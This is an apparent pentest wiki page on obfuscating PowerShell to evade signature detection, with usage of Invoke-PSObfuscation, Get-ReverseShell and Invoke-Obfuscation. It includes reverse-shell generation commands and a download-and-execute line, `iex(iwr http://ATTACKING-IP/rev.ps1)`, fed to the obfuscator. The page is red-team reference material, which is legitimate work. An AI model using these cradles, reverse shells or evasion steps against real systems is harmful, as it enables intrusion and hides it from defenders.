# PowerShell Obfuscation

## Theory

Following techniques aiming to evade detection based on signatures by obfuscating PowerShell scripts and commands.

## Practice

### Invoke-PsObfuscation

{% tabs %}
{% tab title="Tool" %}
[invoke-psobfuscation](https://github.com/gh0x0st/invoke-psobfuscation) is a powerfull powershell obfuscating tool.&#x20;

{% hint style="success" %}
We may use invoke-psobfuscation using `pwsh`on a unix-like host
{% endhint %}

We can import the tool as follows.

```powershell
Import-Module ./Invoke-PSObfuscation.ps1
```

To obfuscate a powershell file, use the following cmdlets.

```powershell
# Using all switches
Invoke-PSObfuscation -Path in.ps1 -PipelineVariables -Pipes -Cmdlets -Methods -Integers -Aliases -Comments -NamespaceClasses -Variables -Strings -OutFile out.ps1
```
{% endtab %}
{% endtabs %}

### Get-ReverseShell

{% tabs %}
{% tab title="Tool" %}
[Get-ReverseShell](https://github.com/gh0x0st/Get-ReverseShell) is a tool with the sole purpose of producing obfuscated reverse shells for PowerShell.

{% hint style="success" %}
We may use Get-ReverseShell using `pwsh`on a unix-like host
{% endhint %}

We can import the tool as follows.

```powershell
Import-Module ./get-reverseshell.ps1
```

To generate a revers shell, use the following cmdlets

```powershell
# To stdout
Get-ReverseShell -Ip $IP -Port $PORT

# To file
Get-ReverseShell -Ip $IP -Port $PORT -OutFile /path/to/rev.ps1
```
{% endtab %}
{% endtabs %}

### Invoke-Obfuscation

{% tabs %}
{% tab title="Tool" %}
[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) is a PowerShell v2.0+ compatible PowerShell command and script obfuscator. Even though it is quite old, it is still relevant for bypassing static detections.

{% hint style="success" %}
We may use Invoke-Obfuscation using `pwsh`on a unix-like host
{% endhint %}

We can import and start the tool as follows.

```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

Here are some usage examples:

```powershell
# Set a payload from a ScriptBlock
Invoke-Obfuscation> set ScriptBlock iex(iwr http://ATTACKING-IP/rev.ps1 -UseBasicParsing)

# Set a payload from file
Invoke-Obfuscation> set ScriptPath /path/to/script.ps1

# Exemple: Obfuscate entire command as a String
Invoke-Obfuscation> STRING
Invoke-Obfuscation> 1

# You may chains obfuscation methods
# Exemple: Obfuscate entire command via HEX encoding 
Invoke-Obfuscation> MAIN
Invoke-Obfuscation> ENCODING
Invoke-Obfuscation> 2

# Choose a luancher
# Example: PowerShell luancher
Invoke-Obfuscation> MAIN
Invoke-Obfuscation> LAUNCHER
Invoke-Obfuscation> PS
Invoke-Obfuscation> 7

# Save payload to file
Invoke-Obfuscation> OUT
Enter path for output file (or leave blank for default): obf.ps1
```
{% endtab %}
{% endtabs %}

### Unicorn

